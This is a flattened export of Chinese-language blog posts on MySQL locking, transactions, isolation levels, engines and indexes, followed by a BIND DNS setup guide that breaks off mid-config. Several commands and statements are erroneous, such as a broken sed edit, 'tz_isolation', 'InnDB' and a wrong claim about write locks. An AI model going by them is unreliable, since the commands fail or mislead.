    <url>%2Fhexo-mysql4.html</url>
    <content type="text"><![CDATA[摘要：MYsql的并发控制，锁，事务了解，涵盖了事务安全，事务原理，事务回滚点，事务特性 并发控制123456789LOCK TABLES tbl_name [[AS] alias] lock_type [, tbl_name [[AS] alias] lock_type] ...lock_type: READ ， WRITEUNLOCK TABLES -- 解锁FLUSH TABLES tb_name[,...] [WITH READ LOCK]-- 关闭正在打开的表（清除查询缓存），通常在备份前加全局读锁MariaDB [hellodb]&gt; SELECT clause [FOR UPDATE | LOCK IN SHARE MODE]-- 查询时加写或读锁 锁： 读锁：共享锁，只读不可写，多个读互不阻塞， MariaDB [hellodb]&gt; LOCK TABLES students READ; 写锁：独占锁,排它锁，一个写锁会阻塞其它读和它锁 MariaDB [hellodb]&gt; LOCK TABLES students WRITE; 实现 存储引擎：自行实现其锁策略和锁粒度 服务器级：实现了锁，表级锁；用户可显式请求 分类： 隐式锁：由存储引擎自动施加锁 显式锁：用户手动请求 锁机制： innodb默认是行锁，但是如果在事务操做过程中，没有使用到索引，系统会自动进行全表检索苏剧，自动升级为表所，后续事务会讲到。 行锁：只有当前行被锁住，别的用户不能操作当前行 表所：整张表被锁住，别的用户都不能操作 页锁：显示的整页被锁住 read 锁自己可以读，但是不可以写；其他人可以读，不可以写。 12lock tables students read;update students set classid=3 where stuid=25; -- 均不可写，只可读 write 锁自己可以读，但是不可以写；其他人不可以读 123flush tables students; -- 清除缓存lock tables students write;select * from students where stuid=12; -- 其他终端不可读此表，自己可读 死锁：两个或多个事务在同一资源相互占用，并请求锁定对方占用的资源的状态.相当于行级锁。 事务事务了解 事务Transactions：一组原子性的SQL语句，或一个独立工作单元 事务日志：记录事务信息，实现undo,redo等故障恢复功能 1234567891011121314151617181920-- 创建一个账户表use testdb;create table my_account(number char(16) not null unique ,name varchar(20) not null,money decimal(10,2) default 0.0)charset utf8;-- 插入数据insert into my_account values(&apos;0000000000001&apos;,&apos;张三&apos;,100000),(&apos;0000000000002&apos;,&apos;李四&apos;,200000);-- 开启事务start transaction;-- 更新数据库alter table my_account add id int primary key auto_increment first;insert into my_account values (&apos;3&apos;,&apos;0000000000003&apos;,&apos;王五&apos;,300000);update my_account set money = money - 100000 where id = 1 ; -- 另开一个账户查看是否修改了表update my_account set money = money + 100000 where id = 2 ; -- 另开一个账户查看是否修改了表-- 提交事务commit； 事务操作事务操作分为两种：自动事务(默认的)，手动事务 手动事务： 开启事务：告诉系统所有的操作（写）不要直接写到数据库的表中，先放入事务日志中；start transaction; 事务操作：1. 张三账户减少 MariaDB[testdb]&gt; update my_account set money = money - 100000 where id = 1 ; 事务操作：2. 李四账户增加 MariaDB[testdb]&gt; update my_account set money = money + 100000 where id = 2 ; 事务关闭：选择性将日志文件中的操作的结果报错到数据表中，清空事务日志 提交事务：同步数据表（操作成功）commit； 回滚事务：直接清空日志表（操作失败）rollback； 注意：只有事务型存储引擎方能支持此类操作,如innodb 事务原理 回滚点回滚点：在某个成功的操作完成之后，后续的操作有可能成功也可能失败，但是无论结果如何，可以在当前的成功位置上，设置一个点。可以供后续的失败操作返回到该位置，而不是返回所有操作，这个点称为回滚点。 设置回滚点：savepoint 回滚点名字;一个回滚点，只能回滚一次 release savepoint identified; 123456789101112131415161718192021-- 回滚点操作-- 开启事务start transaction;select * from my_account;-- 事务处理1：张三加钱update my_account set money = money + 10000 where id = 1;-- 设置回滚点savepoint sp1;-- 银行扣税update my_account set money = money - 10000 * 0.05 where id = 2 ; -- 扣错了select * from my_account;-- 回滚rollback to sp1;-- 继续操作update my_account set money = money - 10000 * 0.05 where id = 1 ; select * from my_account;-- 提交commit； 自动事务处理在mysql中：默认的都是自动事务处理，用户操作完立即同步到数据表中。 123456789101112-- 系统默认自动事务show variabes like &apos;autocommit&apos;;set autocommit=0-- 李四加工资start transaction;update my_account set money = money + 10000 where id = 2;-- 手动提交commit；-- 一般使用自动事务set autocommit=1-- 扣税update my_account set money = money - 10000*0.05 where id = 2; 注意：通常都会使用自动事务. 减少重复的工作 事务的特性 ACID特性： A：atomicity原子性；整个事务中的所有操作要么全部成功执行，要么全部失败后回滚 C：consistency一致性；数据库总是从一个一致性状态转换为另一个一致性状态 I：Isolation隔离性；一个事务所做出的操作在提交之前，是不能为其它事务所见，存于数据的日志中，彼此之间不受影响；隔离有多种隔离级别，实现并发 D：durability持久性；一旦事务提交，其所做的修改会永久保存于数据库中 事务隔离级别：从上至下更加严格 READ-UNCOMMITTED 可读取到未提交数据，产生脏读 READ-COMMITTED 可读取到提交数据，但未提交数据不可读，产生不可重复读，即可读取到多个提交数据，导致每次读取数据不一致 REPEATABLE-READ 可重复读，多次读取数据都一致，产生幻读，即读取过程中，即使有其它提交的事务修改数据，仍只能读取到未修改前的旧数据。此为MySQL默认设置 SERIALIZABILE 可串行化，未提交的读事务阻塞修改事务，或者未提交的修改事务阻塞读事务。导致并发性能差 MVCC: 多版本并发控制，和事务级别相关 事务的隔离性：READ-UNCOMMITTED在两个会话中1234set tx_isolation=&apos;READ-UNCOMMITTED&apos;;start transaction;update my_account set money = money + 10000 where name = &apos;王五&apos;;select * from my_account; -- 未提交，产生脏读 事务的隔离性：READ-COMMITTED在两个会话中12345set tx_isolation=&apos;READ-COMMITTED&apos;;start transaction;update my_account set money = money + 10000 where name = &apos;李四&apos;;select * from my_account; -- 未提交，另外一边不能读到未提交的数据commit； -- 提交之后，可以读取新数据 事务的隔离性：REPEATABLE-READ123456set tx_isolation=&apos;REPEATABLE-READ&apos;;start transaction;update my_account set money = money + 10000 where name = &apos;张三&apos;;select * from my_account; commit； select * from my_account; --不管是否提交，都看不到新的数据 事务的隔离性：SERIALIZABILE不用索引，系统会进行全表索引，会导致事务升级为表级锁，并发性能差 123set tz_isolation=&apos;SERIALIZABILE&apos;;start transaction;update my_account set money = money + 10000 where name = &apos;张三&apos;; 123select * from my_account ; -- 数据未更新update my_account set money = money + 10000 where id = 2;-- 显示等待，事务升级为表级锁 总结：支持事务的引擎有innodb，而myisam是不支持事务的，一般涉及到钱的，基本会用到事务。 12345678910start transaction;update students set gender=&apos;M&apos;; -- 未提交，导致全表锁，造成大量用户无法访问show processlist;+----+--------+-----------+---------+---------+------+----------+------------------+----------+| Id | User | Host | db | Command | Time | State | Info | Progress |+----+--------+-----------+---------+---------+------+----------+------------------+----------+| 10 | root | localhost | hellodb | Query | 0 | init | show processlist | 0.000 || 11 | root | localhost | hellodb | Sleep | 4962 | | NULL | 0.000 |+----+--------+-----------+---------+---------+------+----------+------------------+----------+kill id -- 杀掉进程]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL(三)]]></title>
    <url>%2Fhexo-mysql3.html</url>
    <content type="text"><![CDATA[摘要：mysql的数据引擎，服务器配置，query_cache，索引，锁等相关的介绍 MYSQL数据库引擎MyISAM引擎特点： 不支持事务 表级锁定 读写相互阻塞，写入不能读，读时不能写 只缓存索引 不支持外键约束 不支持聚簇索引 读取数据较快，占用资源较少 不支持MVCC（多版本并发控制机制）高并发 崩溃恢复性较差 MySQL5.5.5前默认的数据库引擎 Myisam适用场景：只读，小文件，引擎文件如下 Myisam的引擎文件： tbl_name.frm: 表格式定义 tbl_name.MYD: 数据文件 tbl_name.MYI: 索引文件 innoDBInnoDB引擎特点： 行级锁 支持事务，适合处理大量短期事务 读写阻塞与事务隔离级别相关 可缓存数据和索引 崩溃恢复性更好 支持MVCC高并发 从MySQL5.5后支持全文索引 从MySQL5.5.5开始为默认的数据库引擎 Locking granularity raw lock transactions 支持事务，适合处理大量短期事务 Clustered indexes 聚簇索引 Date/Index caches Foreign key support 每个表单独使用一个表空间存储表的数据和索引 启用：innodb_file_per_table=ON两类文件放在数据库独立目录中 数据文件(存储数据和索引)：tb_name.ibd 表格式定义：tb_name.frm。 123456789]#vim /etc/my.cnf[mysqld]innodb_file_per_tabledefault_storage_engine=InnDB]# systemctl restart mariadb]#mysql &lt; hellodb1_innodb.sql]#ll /var/lib/mysql/hellodb1/-rw-rw----. 1 mysql mysql 8636 Jun 8 10:38 classes.frm-rw-rw----. 1 mysql mysql 98304 Jun 8 10:38 classes.ibd 查看mysql支持的存储引擎: 12show engines;show variables like &apos;%storage_engine%&apos;; 设置默认的存储引擎： 123vim /etc/my.conf[mysqld]default_storage_engine= InnoDB; 查看库中所有表使用的存储引擎 Show table status from db_name; 查看库中指定表的存储引擎 12show table status like &apos; tb_name &apos;;show create table tb_name; 设置表的存储引擎： 12CREATE TABLE tb_name(... ) ENGINE=InnoDB;ALTER TABLE tb_name ENGINE=InnoDB; 服务器配置 服务器系统变量：分全局和会话两种 服务器状态变量：分全局和会话两种 获取运行中的mysql进程使用各服务器参数及其值 12mysql&gt; SHOW GLOBAL VARIABLES;mysql&gt; SHOW [SESSION] VARIABLES; 设置服务器系统变量三种方法： 在命令行中设置:shell&gt; ./mysqld_safe –-skip-name-resolve=1; 在配置文件my.cnf中设置：]#vim /etc/my.cnf skip_name_resolve=1; 在mysql客户端使用SET命令：mysql&gt;SET GLOBAL sql_log_bin=0 修改服务器变量的值： mysql&gt; help SET 修改全局变量：仅对修改后新创建的会话有效；对已经建立的会话无效 mysql&gt; SET GLOBAL system_var_name=value; mysql&gt; SET @@global.system_var_name=value; 修改会话变量： mysql&gt; SET [SESSION] system_var_name=value; mysql&gt; SET @@[session.]system_var_name=value; 状态变量（只读）：用于保存mysqld运行中的统计数据的变量，不可更改 mysql&gt; SHOW GLOBAL STATUS; mysql&gt; SHOW [SESSION] STATUS; varialbes查询一些系统自带的变量，数据文件datadir,baseddir, tmpdir 123MariaDB [(none)]&gt; show variables like &apos;datadir&apos;;MariaDB [(none)]&gt; show variables like &apos;basedir&apos;;MariaDB [(none)]&gt; show variables like &apos;%dir&apos;; SQL_MODE SQL_MODE：对其设置可以完成一些约束检查的工作,可分别进行全局的设置或当前会话的设置，参看：官方介绍常见MODE: NO_AUTO_CREATE_USER禁止GRANT创建密码为空的用户 NO_AUTO_VALUE_ON_ZERO在自增长的列中插入0或NULL将不会是下一个自增长值 NO_BACKSLASH_ESCAPES反斜杠“\”作为普通字符而非转义字符 PAD_CHAR_TO_FULL_LENGTH启用后，对于CHAR类型将不会截断空洞数据 PIPES_AS_CONCAT将”||”视为连接操作符而非“或运算符” 1234567891011MariaDB [(none)]&gt; SHOW VARIABLES LIKE &apos;sql_mode&apos;; #默认为空+---------------+-------+| Variable_name | Value |+---------------+-------+| sql_mode | |+---------------+-------+MariaDB [hellodb]&gt; set sql_mode=&apos;NO_AUTO_CREATE_USER&apos;;MariaDB [hellodb]&gt; grant all on *.* to hong@&apos;192.%&apos; ; #这里授权创建用户就提示错误ERROR 1133 (42000): Can&apos;t find any matching row in the user tableMariaDB [hellodb]&gt; set sql_mode=&apos;&apos;;MariaDB [hellodb]&gt; grant all on *.* to hong@&apos;192.%&apos; ; #删除sql_mode，立马生效， 这里的sql_mode权限比较多，set起来比较麻烦，系统自带关键字traditional traditonal=STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION 设置sql_mode权限如下： 12MariaDB [(none)]&gt; set sql_mode=&apos;traditional&apos;MariaDB [(none)]&gt; show variables like &apos;sql_mode&apos;; #可以看到一大串的sql_mode了。 Query Cache 优缺点不需要对SQL语句做任何解析和执行，当然语法解析必须通过在先，直接从Query Cache中获得查询结果，提高查询性能查询缓存的判断规则，不够智能，也即提高了查询缓存的使用门槛，降低其效率；查询缓存的使用，会增加检查和清理Query Cache中记录集的开销 SQL_NO_CACHE 查询语句中含有获得值的函数，包含自定义函数，如：NOW() CURDATE()、GET_LOCK()、RAND()、CONVERT_TZ()等 系统数据库的查询：mysql、information_schema 查询语句中使用SESSION级别变量或存储过程中的局部变量 查询语句中使用了LOCK IN SHARE MODE、FOR UPDATE的语句，查询语句中类似SELECT …INTO 导出数据的语句 对临时表的查询操作；存在警告信息的查询语句；不涉及任何表或视图的查询语句；某用户只有列级别权限的查询语句 事务隔离级别为Serializable时，所有查询语句都不能缓存 1234567891011MariaDB [(none)]&gt; show variables like &apos;query_cache%&apos;;+------------------------------+---------+| Variable_name | Value |+------------------------------+---------+| query_cache_limit | 1048576 | #1M,单个查询结果能缓存的最大值| query_cache_min_res_unit | 4096 | #4k,查询缓存中内存块的最小分配单位| query_cache_size | 0 | #查询缓存总共可用的内存空间，1024的整数倍| query_cache_strip_comments | OFF | | query_cache_type | ON | #是否开启缓存功能| query_cache_wlock_invalidate | OFF | #某表被其它的会话锁定，是否从查询返回结果+------------------------------+---------+ 查询缓存相关的状态变量12345678910111213MariaDB [(none)]&gt; show global status like &apos;Qcache%&apos;;+-------------------------+----------+| Variable_name | Value |+-------------------------+----------+| Qcache_free_blocks | 1 || Qcache_free_memory | 33536824 || Qcache_hits | 0 || Qcache_inserts | 0 || Qcache_lowmem_prunes | 0 || Qcache_not_cached | 4 || Qcache_queries_in_cache | 0 || Qcache_total_blocks | 1 |+-------------------------+----------+ 解释如下： Qcache_free_blocks：处于空闲状态 Query Cache中内存 Block 数 Qcache_free_memory：处于空闲状态的 Query Cache 内存总量 Qcache_hits：Query Cache 命中次数 Qcache_inserts：向 Query Cache 中插入新的 Query Cache 的次数，即没有命中的次数 Qcache_lowmem_prunes：当 Query Cache 内存容量不够，需要删除老的Query Cache 以给新的 Cache 对象使用的次数 Qcache_not_cached：没有被 Cache 的 SQL 数，包括无法被 Cache 的 SQL 及由于 query_cache_type 设置的不会被 Cache 的 SQL语句 Qcache_queries_in_cache：在 Query Cache 中的 SQL 数量 Qcache_total_blocks：Query Cache 中总的 Block 修改query_cache_size的值，保存到配置文件使之生效123]#vim /etc/my.cnf]#sed -i &apos;/mysqld\query_cache_size=10M/&apos; /etc/my.cnf]#systemctl restart mariadb 索引索引简介索引：系统根据某种算法，将已有的数据（未来可能增加的数据），单独建立一个文件，文件能实现亏啊苏匹配数据，并且能够快速找到对应表的记录。 索引是特殊数据结构： 定义在查找时作为查找条件的字段 索引实现在存储引擎 优点： 索引可以降低服务需要扫描的数据量，减少了IO次数 索引可以帮助服务器避免排序和使用临时表 索引可以帮助将随机I/O转为顺序I/O 缺点： 占用额外空间，影响插入速度 索引类型： 聚簇（集）索引、非聚簇索引： 数据和索引存储顺序是否一致，数据和所以是否存放一起 主键索引、辅助索引 稠密索引、稀疏索引：是否索引了每一个数据项 B+ TREE、HASH、R TREE 简单索引、组合索引 左前缀索引： 取前面的字符做索引 覆盖索引： 从索引中即可取出要查询的数据，性能高 explain 跟踪解释索引的信息 123456789MariaDB [hellodb]&gt; SET GLOBAL userstat=1; #查询索引使用情况的开关MariaDB [hellodb]&gt; explain select * from students where age = 20\G; raws: 25MariaDB [hellodb]&gt; CREATE INDEX INDEX_AGE ON students(AGE); #建立age索引MariaDB [hellodb]&gt; explain select * from students where age = 20\G; #解析命令查询结果raws: 2MariaDB [hellodb]&gt; CREATE INDEX INDEX_NAME ON students(name);MariaDB [hellodb]&gt; explain select * from students where name like &apos;%b&apos;\G;MariaDB [hellodb]&gt; SHOW INDEX_STATISTICS; 删除索引,并建立符合索引 123456789101112131415161718drop index index_age on students;create index index_name_age on students(name,age);explain select * from students where name like&apos;S%&apos;; -- 用到索引explain select * from students where name like&apos;%x%&apos;; -- 没有用到索引explain select * from students where age=19; -- 没有用到索引explain select * from students where stuid &gt;10 and age=19; -- 用到索引explain select * from students where name=&apos;Xi Ren&apos;; -- 用到索引explain select * from students where age &gt; (select avg(age) from students )\G;*************************** 1. row *************************** id: 1 select_type: PRIMARY table: students type: ALL*************************** 2. row *************************** id: 2 select_type: SUBQUERY table: students type: index 总结：复合索引的顺序很重要，比如index_name_age,name相当于主索引，age相当于副索引，不同的语法导致会用不到索引。可以用explain比较两条SQL语句查询用到的raws数，比较命令的好坏 B+TREE B+ Tree索引：顺序存储，每一个叶子节点到根结点的距离是相同的；左前缀索引，适合查询范围类的数据 可以使用B-Tree索引的查询类型： 全值匹配：精确所有索引列，如：姓wang，名xiaochun，年龄30匹配最左前缀：即只使用索引的第一列，如：姓wang匹配列前缀：只匹配一列值开头部分，如：姓以w开头的匹配范围值：如：姓ma和姓wang之间精确匹配某一列并范围匹配另一列：如：姓wang,名以x开头的只访问索引的查询 B-Tree索引的限制： 如果不从最左列开始，则无法使用索引：如：查找名为xiaochun，或姓为g结尾 不能跳过索引中的列：如：查找姓wang，年龄30的，只能使用索引第一列 如果查询中某个列是为范围查询，那么其右侧的列都无法再使用索引：如：姓wang,名x%,年龄30，只能利用姓和名上面的索引 特别提示： 索引列的顺序和查询语句的写法应相匹配，才能更好的利用索引 为优化性能，可能需要针对相同的列但顺序不同创建不同的索引来满足不同类型的查询需求 Hash 索引 Hash索引：基于哈希表实现，只有精确匹配索引中的所有列的查询才有效，索引自身只存储索引列对应的哈希值和数据指针，索引结构紧凑，查询性能好 只有Memory存储引擎支持显式hash索引 适用场景： 只支持等值比较查询，包括=, IN(), &lt;=&gt; 不适合使用hash索引的场景： 不适用于顺序查询：索引存储顺序的不是值的顺序 不支持模糊匹配 不支持范围查询 不支持部分索引列匹配查找：如A，B列索引，只查询A列索引无效 索引优化策略： 独立地使用列：尽量避免其参与运算，独立的列指索引列不能是表达式的一 部分，也不能是函数的参数，在where条件中，始终将索引列单独放在比较符号的一侧 左前缀索引：构建指定索引字段的左侧的字符数，要通过索引选择性来评估 索引选择性：不重复的索引值和数据表的记录总数的比值 多列索引：AND操作时更适合使用多列索引，而非为每个列创建单独的索引 选择合适的索引列顺序：无排序和分组时，将选择性最高放左侧 索引优化建议: 只要列中含有NULL值，就最好不要在此例设置索引，复合索引如果有NULL值，此列在使用时也不会使用索引; 尽量使用短索引，如果可以，应该制定一个前缀长度; 对于经常在where子句使用的列，最好设置索引; 对于有多个列where或者order by子句，应该建立复合索引; 对于like语句，以%或者‘-’开头的不会使用索引，以%结尾会使用索引; 尽量不要在列上进行运算（函数操作和表达式操作）; 尽量不要使用not in和&lt;&gt;操作; 多表连接时，尽量小表驱动大表，即小表 join 大表; 在千万级分页时使用limit; 对于经常使用的查询，可以开启缓存; 大部分情况连接效率远大于子查询. mysql中提供了多种索引 主键索引：primary key 唯一索引：unique key 全文索引：full 普通索引：index 并发控制123456789LOCK TABLES tbl_name [[AS] alias] lock_type [, tbl_name [[AS] alias] lock_type] ...lock_type: READ ， WRITEUNLOCK TABLES #解锁FLUSH TABLES tb_name[,...] [WITH READ LOCK]#关闭正在打开的表（清除查询缓存），通常在备份前加全局读锁MariaDB [hellodb]&gt; SELECT clause [FOR UPDATE | LOCK IN SHARE MODE]#查询时加写或读锁 锁： 读锁：共享锁，只读不可写，多个读互不阻塞， MariaDB [hellodb]&gt; LOCK TABLES students READ; 写锁：独占锁,排它锁，一个写锁会阻塞其它读和它锁 MariaDB [hellodb]&gt; LOCK TABLES students WRITE; 实现 存储引擎：自行实现其锁策略和锁粒度 服务器级：实现了锁，表级锁；用户可显式请求 分类： 隐式锁：由存储引擎自动施加锁 显式锁：用户手动请求 锁机制： innodb默认是行锁，但是如果在事务操做过程中，没有使用到索引，系统会自动进行全表检索苏剧，自动升级为表所，后续事务会讲到。 行锁：只有当前行被锁住，别的用户不能操作当前行 表所：整张表被锁住，别的用户都不能操作 页锁：显示的整页被锁住 read 锁自己可以读，但是不可以写；其他人可以读，不可以写。 123lock tables students read;update students set classid=3 where stuid=25;ERROR 1099 (HY000): Table &apos;students&apos; was locked with a READ lock and can&apos;t be updated write锁自己可以读，但是不可以写；其他人不可以读 123flush tables students; #清除缓存lock tables students write;select * from students where stuid=12;]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS服务]]></title>
    <url>%2FHexo-Dns.html</url>
    <content type="text"><![CDATA[DNS服务DNS:Domain Name Service 应用层协议 C/S,53/udp, 53/tcp BIND：Bekerley Internat Name Domain ISC本地名称解析配置文件：hosts /etc/hosts%WINDIR%/system32/drivers/etc/hosts93.46.8.89 Google 根域： . 一级域名：Top Level Domain: tld com, edu, mil, gov, net, org, int,arpa 三类：组织域、国家域(.cn, .ca, .hk, .tw)、反向域 二级域名，三级域名，最多127级域名 ICANN（The Internet Corporation for Assigned Names and Numbers）互联网名称与数字地址分配机构，负责在全球范围内对互联网通用顶级域名（gTLD）以及国家和地区顶级域名（ccTLD）系统的管理、以及根服务器系统的管理 DNS类型： 递归查询迭代查询名称服务器：域内负责解析本域内的名称的主机根服务器：13组服务器解析类型：正向解析：FQDN –&gt; IP反向解析：IP –&gt; FQDN注意：正反向解析是两个不同的名称空间，是两棵不同的解析树 一次完整的查询请求经过的流程： Client –&gt;hosts文件 –&gt;DNS Service Local Cache –&gt; DNS Server(recursion) –&gt; Server Cache –&gt; iteration(迭代) –&gt; 根–&gt; 顶级域名DNS–&gt;二级域名DNS…解析答案：肯定答案：否定答案：请求的条目不存在等原因导致无法返回结果权威答案：非权威答案： 区域zone的资源记录(RR) 记录类型：A, AAAA, PTR, SOA, NS, CNAME, MX, SOA：Start Of Authority，起始授权记录；一个区域解析库有且仅能有一个SOA记录，必须位于解析库的第一条记录 A：internet Address，作用，FQDN –&gt; IP AAAA: FQDN –&gt; IPv6 PTR: PoinTeR，IP –&gt; FQDN NS: Name Server，专用于标明当前区域的DNS服务器 CNAME：Canonical Name，别名记录 MX: Mail eXchanger，邮件交换器 资源记录定义的格式： 语法：name [TTL] IN rr_type value 注意： TTL可从全局继承 @可用于引用当前区域的名字 同一个名字可以通过多条记录定义多个不同的值；此时DNS服务器会以轮询方式响应 同一个值也可能有多个不同的定义名字；通过多个不同的名字指向同一个值进行定义；此仅表示通过多个不同的名字可以找到同一个主机 正向解析文件格式FQDN—&gt;IP /var/named/ZONE_NAME.zone 12345678910111213141516$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 0 ; Serial #序列号，主从服务器同步更新的条件，最多4294967296(2^32) 1D ; Refresh #刷新时间,slave 会去向 master 要求数据更新的判断的时间定义 1H ; Retry #重试时间 1W ; Expire #过期时间 3H ) ; minimum NS dns1.feng.com. #省略写法，dns1.feng.com. 1D IN NS dns1.feng.com.dns1 A 192.168.1.8 #省略写法，dns1.feng.com. 1D IN A 192.168.1.8 master A 192.168.1.200 #省略写法，master.feng.com. 1D IN A 192.168.1.100$GENERATE 1-254 HOST$ A 192.168.1.$ #对应192.168.1.&#123;1..254&#125;的主机对应记录*.feng.com A 192.168.1.200 #泛域名解析websrv A 192.168.1.10websrv A 192.168.1.11websrv A 192.168.1.12www CNAME websrv #别名解析，实现负载均衡。 SOA数据的说明: Serial &lt; 2^32 = 4294967296Refresh &gt;= Retry 2Refresh + Retry &lt; ExpireExpire &gt;= Rrtry 10Expire &gt;= 7D 一般来说，如果 DNS RR 资料变更情况频繁的，那么上述的相关数值可以订定的小一些，如果 DNS RR 是很稳定的， 为了节省带宽，则可以将 Refresh 设定的较大一些 . 反向解析文件格式IP —&gt;FQDN /var/named/ZONE_NAME.zone 1234567$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com.dns1.feng.com. A 192.168.1.98 PTR websrv.feng.com. #省略写法， 8.1.168.192.in-addr.arpa. IN PTR websrv.feng.com.6 PTR appsrv.feng.com.100 PTR mailsrv.feng.com. 子域 子域授权：每个域的名称服务器，都是通过其上级名称服务器在解析库进行授权，资源记录如下： 1234.com. IN NS ns1.com..com. IN NS ns2.com.ns1.com. IN A 2.2.2.1ns2.com. IN A 2.2.2.2 bind服务器(base源)安装bind服务yum install -y bind文件： 主配置文件：/etc/named.conf, /etc/named.rfc1912.zones, /etc/rndc.key 解析库文件：/var/named/ ZONE_NAME.ZONE 解析库文件必须存在named.ca文件，默认与bind安装在同一主机，且只能通过127.0.0.1连接named进程 测试命令digdig [-t type] name [@SERVER][query options] dig只用于测试dns系统，不会查询hosts文件进行解析 查询选项： +[no]trace：跟踪解析过程 : dig +trace feng.com+[no]recurse：进行递归解析测试反向解析：dig -x IP = dig –t ptr reverseip.in-addr.arpa模拟区域传送： 12345dig -t axfr ZONE_NAME @SERVERdig -t axfr feng.com @10.10.10.11dig –t axfr 100.1.10.in-addr.arpa @172.16.1.1dig -t NS . @114.114.114.114dig -t NS . @a.root-servers.net host测试命令格式：host [-t type] name [SERVER]12345host –t NS feng.com 172.16.0.1host –t soa feng.comhost –t mx feng.comhost –t axfr feng.comhost 1.2.3.4 nslookup命令及DNS动态更新nslookup命令： nslookup [-option][name][server] 交互式模式： nslookup&gt; server IP: 指明使用哪个DNS server进行查询 set q=RR_TYPE: 指明查询的资源记录类型 NAME: 要查询的名称 指定的zone语句块中或者全局的options配置文件中： Allow-update {any;}; 远程主机端： 1234567891011121314]#chmod 770 /var/named]#setsebool -P named_write_master_zones on]#nsupdate&gt;server 192.168.1.9&gt;zone feng.com&gt;update add ftp.feng.com 88888 IN A 8.8.8.8&gt;send&gt;update delete www.feng.com A &gt;send测试：dig ftp.feng.com @192.168.1.9在DNS服务器端会生成一个日志文件feng.com.zone.jnl]#ll /var/named/feng.com.zone.jnl]#cat /var/named/feng.com.zone将feng.com.zone的文件格式规划好了 客户端的设定架设好DNS服务器后，都需要进行测试，所以这里需要有客户端进行配置好。 12345678/etc/hosts #这个是最早的 hostname 对应 IP 的档案；/etc/resolv.conf #这个重要！就是 ISP 的 DNS 服务器 IP 记录处；/etc/nsswitch.conf #这个档案则是在『决定』先要使用 /etc/hosts 还是 /etc/resolv.conf 的设定！]#vim /etc/resolv.confnameserver DNS_IP #供实验的DNSip地址,一定是第一个nameserver 8.8.8.8nameserver 223.5.5.5nameserver 223.6.6.6 rndc命令rndc —&gt; rndc(953/tcp) 1234567891011121314]#rndc statusversion: 9.9.4-RedHat-9.9.4-61.el7 id:8f9657aaCPUs found: 1worker threads: 1UDP listeners per interface: 1number of zones: 103debug level: 0xfers running: 0xfers deferred: 0soa queries in progress: 0query logging is OFFrecursive clients: 0/0/1000tcp clients: 0/100server is up and running reload: 重载主配置文件和区域解析库文件 reload zonename: 重载区域解析库文件 retransfer zonename: 手动启动区域传送，而不管序列号是否增加 notify zonename: 重新对区域传送发通知 reconfig: 重载主配置文件 querylog: 开启或关闭查询日志文件/var/log/message trace: 递增debug一个级别 trace LEVEL: 指定使用的级别 notrace：将调试级别设置为 0 flush：清空DNS服务器的所有缓存记录 实验1.实现www.feng.com正向反向DNS配置在服务器上进行配置/etc/named.conf12345678910111213]# vim /etc/named.confoptions &#123; listen-on port 53 &#123; localhost; &#125;; #允许localhost连接named进程 listen-on-v6 port 53 &#123; ::1; &#125;; directory &quot;/var/named&quot;; #named家目录 dump-file &quot;/var/named/data/cache_dump.db&quot;; statistics-file &quot;/var/named/data/named_stats.txt&quot;; memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;; allow-query &#123; localhost;any; &#125;; #允许any所有的client进行DNS解析服务 allow-transfer &#123; none;&#125;; #禁止任何人转发···include &quot;/etc/named.rfc1912.zones&quot;; #当然，zone文件也可以放在.conf文件里面。include &quot;/etc/named.root.key&quot;; 配置/etc/named.rfc1912.zones文件123456789]# vim /etc/named.rfc1912.zones #加入两条正向反向解析的域名zone &quot;feng.com&quot; IN &#123; type master; file &quot;feng.com.zone&quot;;&#125;;zone &quot;1.168.192.in-addr.arpa&quot; IN &#123; type master; file &quot;192.168.1.zone&quot;;&#125;; 解析域zone文件的配置1234567891011121314151617181920]# touch /var/named/&#123;feng.com.zone,192.168.1.zone&#125; #建立两套解析域资源]# chgrp named /var/named/&#123;feng.com.zone,192.168.1.zone&#125; #改变文件的属组]# chmod 640 /var/named/&#123;feng.com.zone,192.168.1.zone&#125; #改变文件的权限]# vim /var/named/192.168.1.zone$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com.dns1.feng.com. A 192.168.1.98 PTR websrv.feng.com.6 PTR appsrv.feng.com.100 PTR mailsrv.feng.com.]# vim /var/named/feng.com.zone$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com.dns1 A 192.168.1.9websrv A 192.168.1.10websrv A 192.168.1.11www CNAME websrv]#systemctl start named #至此，DNS正向反向解析库配置完成，客户端使用dig即可完成DNS解析。 实验2.实现DNS的主从服务器配置要点：1、应该为一台独立的名称服务器2、主服务器的区域解析库文件中必须有一条NS记录指向从服务器3、从服务器只需要定义区域，而无须提供解析库文件；解析库文件应该放置于/var/named/slaves/目录中4、主服务器得允许从服务器作区域传送5、主从服务器时间应该同步，可通过ntp进行；6、bind程序的版本应该保持一致；否则，应该从高，主低 从服务器配置：123456789101112131415161718192021222324#主服务器的主配置文件options中(影响全局，若只影响局部，可以在/etc/named.rfc1912.zones添加)：]#vim /etc/named.conf listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; &#125;; allow-transfer &#123; 192.168.1.8; &#125;; #只允许slave_ip传输]#vim /etc/named.rfc1912.zoneszone &quot;feng.com&quot; IN &#123; type master; file &quot;feng.com.zone&quot;;&#125;;]#vim /var/named/feng.com.zone$TTL 1D@ IN SOA dns1.feng.com. admin.feng.com. ( 1 1D 1H 1W 3H ) NS dns1.feng.com. NS dns2.feng.com.dns1 A 192.168.1.9dns2 A 192.168.1.8websrv A 192.168.1.10websrv A 192.168.1.11www CNAME websrv]#chmod 640 /var/named/feng.com.zone]#chgrp named /var/named/feng.com.zone]#systemctl start named #配置完毕，启动服务 从服务器：123456789101112131415161718]#vim /etc/named.confoptions &#123; listen-on port 53 &#123; localhost; &#125;; allow-query &#123; localhost;any; 